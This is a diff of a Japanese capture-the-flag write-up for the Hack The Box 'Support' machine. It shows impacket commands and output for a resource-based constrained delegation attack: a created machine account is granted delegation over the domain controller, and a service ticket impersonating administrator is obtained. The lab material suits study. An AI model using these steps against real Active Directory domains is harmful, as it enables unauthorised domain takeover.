@@ -150,9 +150,9 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Successfully added machine account kali$ with password Ironside47pleasure40Watchful.
 ```
-ターゲットのマシンアカウントの`msDS-AllowedToActOnBehalfOfOtherIdentity`属性に作成したマシンアカウントを追加
+ターゲットのマシンアカウントの`msDS-AllowedToActOnBehalfOfOtherIdentity`属性に作成したマシンアカウントを追加  
+これにてdc$の権限がkali$に委任されるようになる
 ```sh
-┌──(kali㉿kali)-[~/htb/ldap]
 └─$ impacket-rbcd -delegate-to 'dc$' -delegate-from 'kali$' -action 'write' -ts -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -168,6 +168,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [2025-11-07 07:26:58] [*] Accounts allowed to act on behalf of other identity:
 [2025-11-07 07:26:58] [*]     kali$        (S-1-5-21-1677581083-3380853377-188903654-6101)
 ```
+kali$の権限で、dcのcifsにadministratorとしてアクセスするtgsを取得できた
 ```sh
 └─$ impacket-getST -spn 'cifs/dc.support.htb' -impersonate administrator -ts -dc-ip 10.129.230.181 'support/kali$:Ironside47pleasure40Watchful'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
